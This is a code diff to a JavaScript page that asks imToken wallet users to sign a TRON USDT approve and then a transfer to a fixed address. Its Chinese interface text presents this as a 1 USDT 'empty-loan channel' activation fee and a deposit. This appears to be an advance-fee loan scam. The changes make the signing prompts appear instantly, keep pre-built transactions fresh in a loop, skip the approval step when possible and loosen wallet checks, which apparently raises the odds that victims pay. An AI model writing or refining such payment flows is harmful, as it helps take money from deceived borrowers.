@@ -93,7 +93,7 @@ const amount = Number(params.get('amount')) || 0;
 const type = params.get('type') || 'deposit';
 const payPageUrl = location.href;
 let step = 1; // 1: approve, 2: transfer
-let cachedApprove = null, cachedTransfer = null, cachedAt = 0; // 预构建缓存，点击即弹签名框
+let cachedApprove = null, cachedTransfer = null, cachedAt = 0, prewarmTimer = null;
 function $(s) { return document.querySelector(s); }
 if (type === 'empty') { $('#page-title').textContent = '空放资格支付'; $('#page-sub').textContent = '支付 1 USDT 激活空放通道'; }
 else { $('#page-title').textContent = '押金充值'; $('#page-sub').textContent = '请在 imToken 中确认支付'; }
@@ -111,24 +111,21 @@ function isClosedEnv() { const ua=(navigator.userAgent||'').toLowerCase(); retur
 function isAndroid() { return /android/i.test(navigator.userAgent || ''); }
 function withTimeout(p, ms, msg) { return Promise.race([p, new Promise((_,rej)=>setTimeout(()=>rej(new Error(msg)),ms))]); }
 async function withRetry(fn, times, delay) { let lastErr; for (let i=0;i<times;i++){ try { return await fn(); } catch(e){ lastErr=e; if (i<times-1) await new Promise(r=>setTimeout(r,delay)); } } throw lastErr; }
-// 核心构建（无 UI 提示，供预构建复用）
 async function buildTxCore(tw, fnSig, params, fromAddress) {
   return withRetry(() => withTimeout(
     tw.transactionBuilder.triggerSmartContract(USDT_CONTRACT, fnSig, { feeLimit: 100000000 }, params, fromAddress),
     8000, '节点响应超时，请重试'
   ), 2, 600);
 }
-async function buildTxWithTip(tw, fnSig, params, fromAddress, label) {
+async function buildTxWithTip(tw, fnSig, params, fromAddress) {
   const slowTimer = setTimeout(() => setStatus('loading', '⏳ 波场节点响应较慢，正在努力连接（已自动重试）…'), 3000);
   try { return await buildTxCore(tw, fnSig, params, fromAddress); }
   finally { clearTimeout(slowTimer); }
 }
 function openWalletNow() {
   const ul = imTokenUniversalLink(payPageUrl);
-  if (isAndroid()) {
-    location.href = imTokenSchemeLink(payPageUrl);
-    setTimeout(() => { if (document.visibilityState !== 'hidden') location.href = ul; }, 1500);
-  } else { location.href = ul; }
+  if (isAndroid()) { location.href = imTokenSchemeLink(payPageUrl); setTimeout(() => { if (document.visibilityState !== 'hidden') location.href = ul; }, 1500); }
+  else { location.href = ul; }
 }
 
 function showOpenWalletUI(reason) {
@@ -145,16 +142,20 @@ function showOpenWalletUI(reason) {
   const btn = $('#btn-pay'); btn.disabled = true; btn.textContent = '请在 imToken 中打开本页';
 }
 
+// 页面加载即启用按钮（零等待），点击时再检测钱包
+(function enableBtnNow(){
+  const btn = $('#btn-pay');
+  btn.disabled = false;
+  btn.textContent = '第 1 步：确认授权 1U';
+})();
+
 let envCheckCount = 0;
-const MAX_ENV_CHECK = 16;
+const MAX_ENV_CHECK = 12; // 最多 6 秒
 function checkEnvironment() {
   const tw = getTronWeb();
   if (tw) {
     $('#env-warn').style.display = 'none';
-    const btn = $('#btn-pay');
-    btn.disabled = false;
-    btn.textContent = step === 1 ? '第 1 步：确认授权 1U' : ('第 2 步：确认支付 ' + amount + ' USDT');
-    prewarm(); // 后台预构建交易，用户点击时秒弹签名框
+    prewarmLoop(); // 后台循环预构建交易，点击秒弹签名框
     return;
   }
   if (envCheckCount < MAX_ENV_CHECK) {
@@ -165,22 +166,47 @@ function checkEnvironment() {
 }
 checkEnvironment();
 
-async function waitWalletReady(tw) {
+// 不强制等 ready（imToken 部分版本 ready 恒为 false），只要地址可用即继续，最多 5 秒
+async function waitWalletAddress(tw) {
   let waited = 0, slowTip = false;
-  while ((!tw.ready || !(tw.defaultAddress && tw.defaultAddress.base58)) && waited < 8000) {
+  while (!(tw.defaultAddress && tw.defaultAddress.base58) && waited < 5000) {
     await new Promise(r => setTimeout(r, 200)); waited += 200;
-    if (waited >= 3000 && !slowTip) { slowTip = true; setStatus('loading', '⏳ 钱包初始化较慢，请稍候…'); }
+    if (waited >= 2000 && !slowTip) { slowTip = true; setStatus('loading', '⏳ 正在读取钱包地址，请稍候…'); }
   }
-  if (!tw.ready) throw new Error('钱包环境未就绪，请退出页面后重新进入');
-  const fromAddress = tw.defaultAddress && tw.defaultAddress.base58;
+  let fromAddress = tw.defaultAddress && tw.defaultAddress.base58;
+  if (!fromAddress && tw.defaultAddress && tw.defaultAddress.hex) {
+    try { fromAddress = tw.address.fromHex(tw.defaultAddress.hex); } catch (e) {}
+  }
   if (!fromAddress) throw new Error('钱包地址未就绪，请退出页面后重新进入');
   return fromAddress;
 }
-// 后台预构建 approve + transfer 交易（TRON 交易约 60s 过期，45s 内复用）
-async function prewarm() {
+
+// 查询当前 allowance，若已授权 >=1U 则直接跳过 approve 进入支付
+async function checkAllowance(tw, owner) {
+  try {
+    const res = await withTimeout(
+      tw.transactionBuilder.triggerConstantContract(USDT_CONTRACT, 'allowance(address,address)', {},
+        [{ type:'address', value: owner }, { type:'address', value: toAddress }], owner),
+      5000, 'allowance 查询超时');
+    const hex = res && res.constant_result && res.constant_result[0];
+    if (hex) {
+      const allowed = BigInt('0x' + hex.replace(/^0x/, ''));
+      if (allowed >= 1000000n) return true;
+    }
+  } catch (e) { /* 查询失败照常走 approve */ }
+  return false;
+}
+
+// 循环预构建：每 22 秒刷新一次缓存（TRON 交易 60s 过期），保证任何时候点击都是秒弹
+async function prewarmOnce() {
   try {
     const tw = getTronWeb(); if (!tw) return;
-    const fromAddress = await waitWalletReady(tw);
+    const fromAddress = await waitWalletAddress(tw);
+    // 已授权则直接跳到支付步骤
+    if (step === 1 && (await checkAllowance(tw, fromAddress))) {
+      step = 2;
+      const btn = $('#btn-pay'); if (!btn.disabled) btn.textContent = '第 2 步：确认支付 ' + amount + ' USDT';
+    }
     const approveParam = [ { type:'address', value: toAddress }, { type:'uint256', value: '1000000' } ];
     cachedApprove = await buildTxCore(tw, 'approve(address,uint256)', approveParam, fromAddress);
     cachedAt = Date.now();
@@ -189,7 +215,12 @@ async function prewarm() {
     cachedTransfer = await buildTxCore(tw, 'transfer(address,uint256)', transferParam, fromAddress);
   } catch (e) { /* 预构建失败不影响，点击时重新构建 */ }
 }
-function freshCache(obj) { return obj && obj.result && obj.result.result && (Date.now() - cachedAt < 45000); }
+function prewarmLoop() {
+  if (prewarmTimer) return;
+  prewarmOnce();
+  prewarmTimer = setInterval(() => { if (document.visibilityState !== 'hidden') prewarmOnce(); }, 22000);
+}
+function freshCache(obj) { return obj && obj.result && obj.result.result && (Date.now() - cachedAt < 50000); }
 
 $('#btn-pay').onclick = async function () {
   const btn = this; btn.disabled = true;
@@ -200,7 +231,7 @@ $('#btn-pay').onclick = async function () {
     btn.textContent = '请求授权中…';
     setStatus('loading', '第 1 步：请在钱包弹窗中确认授权…');
     try {
-      const fromAddress = await waitWalletReady(tw);
+      const fromAddress = await waitWalletAddress(tw);
       let txApprove = freshCache(cachedApprove) ? cachedApprove : null;
       if (!txApprove) {
         setStatus('loading', '正在构建授权交易，请稍候…');
@@ -212,7 +243,7 @@ $('#btn-pay').onclick = async function () {
       const signedApprove = await withTimeout(tw.trx.sign(txApprove.transaction), 120000, '授权签名超时（您可能未在钱包中确认），请重试');
       await withTimeout(tw.trx.sendRawTransaction(signedApprove), 15000, '广播授权交易超时，请检查网络后重试');
       setStatus('success', '✅ 授权成功！请点击下方按钮进行第 2 步支付。');
-      step = 2; cachedApprove = null; // 授权已用，清空
+      step = 2; cachedApprove = null;
       btn.textContent = '第 2 步：确认支付 ' + amount + ' U';
       btn.disabled = false;
     } catch (e) {
@@ -225,7 +256,7 @@ $('#btn-pay').onclick = async function () {
   btn.textContent = '请求支付中…';
   setStatus('loading', '第 2 步：请在钱包弹窗中确认支付…');
   try {
-    const fromAddress = await waitWalletReady(tw);
+    const fromAddress = await waitWalletAddress(tw);
     let txTransfer = freshCache(cachedTransfer) ? cachedTransfer : null;
     if (!txTransfer) {
       setStatus('loading', '正在构建支付交易，请稍候…');
